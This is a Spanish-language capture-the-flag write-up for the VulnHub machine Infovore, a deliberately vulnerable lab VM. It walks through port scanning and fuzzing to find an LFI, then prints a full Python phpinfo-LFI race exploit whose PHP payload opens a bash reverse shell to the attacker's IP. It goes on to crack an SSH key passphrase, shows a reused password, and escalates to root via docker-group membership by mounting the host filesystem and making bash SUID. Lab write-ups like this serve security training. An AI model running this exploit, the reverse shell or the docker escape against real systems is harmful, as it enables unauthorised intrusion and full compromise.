#Infovore

https://www.vulnhub.com/entry/infovore-1,496/

***
***

- Comenzamos con un escaneo de puertos, podemos observar que solo existe el puerto 80:
~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Infovore]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV infovore.vh
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-06 19:38 EST
NSE: Loaded 46 scripts for scanning.
Initiating ARP Ping Scan at 19:38
Scanning infovore.vh (192.168.17.150) [1 port]
Completed ARP Ping Scan at 19:38, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:38
Scanning infovore.vh (192.168.17.150) [65535 ports]
Discovered open port 80/tcp on 192.168.17.150
Completed SYN Stealth Scan at 19:38, 1.17s elapsed (65535 total ports)
Initiating Service scan at 19:38
Scanning 1 service on infovore.vh (192.168.17.150)
Completed Service scan at 19:38, 6.02s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.17.150.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:38
Completed NSE at 19:38, 0.00s elapsed
Nmap scan report for infovore.vh (192.168.17.150)
Host is up, received arp-response (0.00043s latency).
Scanned at 2023-12-06 19:38:52 EST for 7s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
MAC Address: 00:0C:29:4D:8D:FF (VMware)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
~~~

- Traté de enumerar la pagina web pero no resultó nada útil, así que me rendí y utilicé un escaneo básico con nmap:
~~~ bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Infovore]
└─$ nmap --script=http-enum -p80 infovore.vh 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-06 19:54 EST
Nmap scan report for infovore.vh (192.168.17.150)
Host is up (0.00030s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /info.php: Possible information file

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
~~~
- Y tenemos un `info.php`, analizándolo vemos que la configuración de php nos permite subir archivos:
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/bac6aad3-c40d-4504-b21d-afc79735037c)

- Encontré un articulo en [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo) donde mencionan una Remote Code Execution a través de una LFI, pero para esto, obviamente es necesario descubrir una LFI primero.
- Como supuse, la pagina de inicio utiliza un `idex.php` como base, así que después de intentar varias cosas, se me ocurrió que quizá existe un parámetro que llame a una pagina, lógica de CTF.
- Utilicé `wfuzz` para ver si existía alguno:
~~~ bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Infovore]
└─$ wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://infovore.vh/index.php?FUZZ=/etc/passwd' -t 200 -c      
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://infovore.vh/index.php?FUZZ=/etc/passwd
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        136 L    382 W      4743 Ch     "# directory-list-2.3-medium.txt"
000000032:   200        136 L    382 W      4743 Ch     "blog"
000000087:   200        136 L    382 W      4743 Ch     "16"
000000095:   200        136 L    382 W      4743 Ch     "20"
000000071:   200        136 L    382 W      4743 Ch     "security"
000000064:   200        136 L    382 W      4743 Ch     "02"
000000144:   200        136 L    382 W      4743 Ch     "ads"
000000175:   200        136 L    382 W      4743 Ch     "publications"
~~~

- Y bueno, todas nos las toma por validas así que quito esa cantidad de palabras:
~~~ bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Infovore]
└─$ wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://infovore.vh/index.php?FUZZ=/etc/passwd' -t 200 -
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correcites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://infovore.vh/index.php?FUZZ=/etc/passwd
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000025370:   200        26 L     33 W       1006 Ch     "filename"                                                                   
Total time: 139.3797
Processed Requests: 220560
Filtered Requests: 2205
~~~

- Y encontramos algo, un parámetro `filename` que, en efecto nos deja listar archivos internos del sistema:
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/7a61bbc3-ac2f-41cd-8e99-f2b3878e44a3)

- Ahora si, el articulo de HackTricks menciona un script que ya no existe, pero buscando por el nombre lo encontré en otro repositorio del mismo autor:
	  - Source: https://github.com/mikaelkall/HackingAllTheThings/blob/master/lfi/phpinfolfi.py
- **OJO**, el exploit está en Python2.7
- Modifiqué un poco algunas variables y el payload, al final quedó así:
~~~ python
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php system("bash -c \'bash -i >& /dev/tcp/192.168.17.128/4444 0>&1\'");?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script
    LFIREQ="""GET /index.php?filename=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:

        i = d.index("[tmp_name] =&gt")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args
    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1
            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()

            except socket.error:
                return
def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)
        d+=i
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():

    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)

    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()

    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    print "Don't forget to modify the LFI URL"
    main()
~~~
  
- Solo quedaría ponernos en escucha por el puerto que pongamos en el payload.
- Y ya ganaríamos acceso, realizamos el ritual para tratar la TTY:
  ~~~ bash
script /dev/null -c bash
^Z
#Dejamos nuestra sesión en segundo plano
stty raw -echo; fg
#Nuestro tecleo será invisible, reiniciamos la xterm de igual manera
reset xterm
#Nos aparecerá un mensaje
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
  ~~~

***
<h3>PrivEsc:</h3>

- Estuve buscando miles de cosas para este punto, llegué solo a una conclusión y fue que nos encontrábamos en un docker, ejecutando `hostname -I`.
- Así mismo, enumerando directorio por directorio encontré algo curioso en la raíz del sistema, un archivo comprimido con un nombre peculiar:
  ~~~ bash
www-data@e71b67461f6c:/$ ls -la
total 464
drwxr-xr-x 74 root root   4096 Jun 23  2020 .
drwxr-xr-x 74 root root   4096 Jun 23  2020 ..
-rwxr-xr-x  1 root root      0 Jun 22  2020 .dockerenv
-rw-r--r--  1 root root   1197 Apr 27  2020 .oldkeys.tgz
~~~
- Lo copiamos a `/tmp` para descomprimirlo:
~~~ bash 
www-data@e71b67461f6c:/$ cp .oldkeys.tgz tmp/oldkeys.tgz
www-data@e71b67461f6c:/$ cd tmp
www-data@e71b67461f6c:/tmp$ tar -xzvf oldkeys.tgz
root
root.pub
~~~~
- Si vemos el contenido de los archivos, parecen ser un par de llaves para `ssh`.
- Aquí tendremos que romper el contenido de la llave privada, copiamos su contenido a un archivo de nuestra maquina llamado `id_root`:
- Utilizamos `ssh2jhon`:
~~~ bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Infovore]
└─$ ssh2john id_root
id_root:$sshng$1$16$2037F380706D4511A1E8D114860D9A0E$448$76ced3d5d2dfc66ee8d0d0bddcf3902cb8e9b538cc305549e2ac4d94ed97b7eac1aa0006ed8401cba4e98f667657165bbb231ed2f33222937d8cd15e3856cbe36458acc574579d154ddfecee962aae9f211d859d5f4fa631f29fa06f146aa5b28017588ac5294699b25701b5cd0405d5397b127116907d445ba2ce03d84683a0eba2d72a5878a87e2b8d77298fb6537e8adfee5157d2962f81351ab31ac374d5cade1b483d3cbe937d2d2a353926798a56c6ded8fbf47ede9c9a4c11c6f2111ecd9717db8aaf5b5298d80ae9492298957670f81c11e422e4e92ffd5255b81a5b3d6112bb265e26cc119db693fce5afe97cba309962919aa0b0d841fcee665429869fd36c358db556ca35cecbc4b034236bf3bcc9b2d4299a038849473b0a49ea244a6fd64cd71152427de780d75eb776ee1115f11315abb100bb4a2f2940a8cb386ea70e266d4d56e1c0989773e3e5531914a63bff81f8b34b886266f7feda5451a2f7992ea3116cb48906dc7595a1d60b13f1546d5a8e8eab08049c682b7ac1b7be58b24760af7414f6f9041936566c8de560dac5d260d38aa3472a3b2889e92149a50133cd2701d11f1f34acdb24961100dde077fdfcb9f7c3915386f51ffa
~~~
- Y nos da un hash, que ahora podemos romper con `jhon`, copiamos este contenido a un archivo `hash_root`:
- No alcancé a capturar cuando rompí la contraseña, pero la sintaxis sería:
  ~~~ bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hash_root
  ~~~
  - Y tendríamos la contraseña para ssh.
  - Como estamos en un docker y nuestra IP es `192.168.150.21`, es obvio que en nuestro equipo atacante no tendremos acceso, pues el puerto 22 de la maquina real está cerrado:
- Intentamos conectarnos al host que sería `192.168.150.1`.
~~~ bash 
www-data@e71b67461f6c:/tmp$ chmod 600 root          
www-data@e71b67461f6c:/tmp$ ssh root@192.168.150.1 -i root
Could not create directory '/var/www/.ssh'.
The authenticity of host '192.168.150.1 (192.168.150.1)' can't be established.
ECDSA key fingerprint is SHA256:47B5q99t6wwHcxTX3Yff0gVrP/Ieun/2T9scPz20xHc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
~~~
- Vemos que al parecer la contraseña ya no funciona, pero siempre podemos ver si las credenciales fueron reutilizadas para el usuario root del docker:
~~~ bash
www-data@e71b67461f6c:/tmp$ su root
Password: choclate93
root@e71b67461f6c:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
~~~
- Okay, somos root pero dentro del docker, por lo cual ahora debemos salir de este.
- Probé viendo el directorio `.ssh` desde la carpeta de root:
- Viendo que existe un archivo `known_hosts` y que hay una llave pública que pertenece a un usuario admin con dirección IP del host del docker, lo que nos hace pensar que podemos conectarnos por `ssh` a este usuario empleando la contraseña que utilizamos para conectarnos como root:
  ~~~ bash
root@e71b67461f6c:~/.ssh# ssh admin@192.168.150.1 -i id_rsa
Enter passphrase for key 'id_rsa': choclate93

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Dec  6 14:54:49 2023 from 192.168.150.21
-bash-4.3$ hostname -I
192.168.17.150 192.168.150.1 172.17.0.1
  ~~~
  - Y hemos escapado del docker, si revisamos los grupos en los que estamos, podemos ver algo curioso:
~~~ bash
-bash-4.3$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
~~~
- Estamos en el grupo de docker, por lo que podemos crear, eliminar y ejecutar contenedores:
  - Crearemos un docker donde montaremos toda la carpeta raíz dentro de `mnt/root`:
  ~~~ bash
-bash-4.3$ docker pull alpine:latest
latest: Pulling from library/alpine
c926b61bad3b: Downloading [>                                                  ]  34.76kB/3.402c926b61bad3b: Downloading [=======>                                           ]  506.2kB/3.402c926b61bad3b: Downloading [=======================>                           ]   1.62MB/3.402c926b61bad3b: Downloading [================================================>  ]  3.324MB/3.402c926b61bad3b: Extracting [>                                                  ]  65.54kB/3.402Mc926b61bad3b: Extracting [==================================================>]  3.402MB/3.402Mc926b61bad3b: Extracting [==================================================>]  3.402MB/3.402Mc926b61bad3b: Pull complete 
Digest: sha256:34871e7290500828b39e22294660bee86d966bc0017544e848dd9a255cdf59e0
Status: Downloaded newer image for alpine:latest
-bash-4.3$ docker run --rm -dit -v /:/mnt/root --name GetRoot alpine
65259847c81c24ebc13938413d04ac227b8b48c67088af5fbbc2dfbbd57401a5
-bash-4.3$ docker exec -it GetRoot sh
/ #
~~~
- Y lo que tendríamos que hacer ahora es simplemente añadirle permisos SUID a bash desde la carpeta montada:
~~~ bash
/ # cd /mnt/root/bin/
/mnt/root/bin # chmod u+s bash
/mnt/root/bin # exit
-bash-4.3$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1029624 Mar 25  2019 /bin/bash
-bash-4.3$ bash -p
bash-4.3# cd /root
bash-4.3# cat root.txt
~~~
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/6ac66449-7305-4e69-b960-d582d50230b2)

- Y ahí está, somos root en el servidor :D
